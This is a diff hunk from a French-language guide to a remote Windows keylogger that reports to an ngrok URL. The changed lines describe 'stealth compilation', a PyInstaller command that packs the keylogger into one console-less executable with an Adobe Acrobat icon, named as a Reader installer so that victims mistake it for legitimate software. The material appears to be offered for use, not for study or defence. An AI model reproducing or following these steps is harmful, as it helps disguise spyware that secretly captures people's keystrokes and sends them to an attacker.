@@ -71,7 +71,7 @@ Ouvrez le fichier keylogger_win_remote.py et modifiez la variable NGROK_URL avec
 Compilation Furtive :
 Ouvrez l'invite de commande (CMD) dans le dossier du script et exécutez la commande suivante. Elle génère un exécutable unique, sans console, avec l'icône d'Adobe Acrobat :
 
-`py -m PyInstaller --onefile --noconsole --hidden-import pynput --icon=acrobat.ico --clean --name Reader_install keylogger_win_remote.py`
+`py -m PyInstaller --onefile --noconsole --hidden-import pynput --icon=acrobat.ico --clean Reader_install.py`
 
 
 --onefile : Package tout (Python, libs, script) dans un seul .exe.
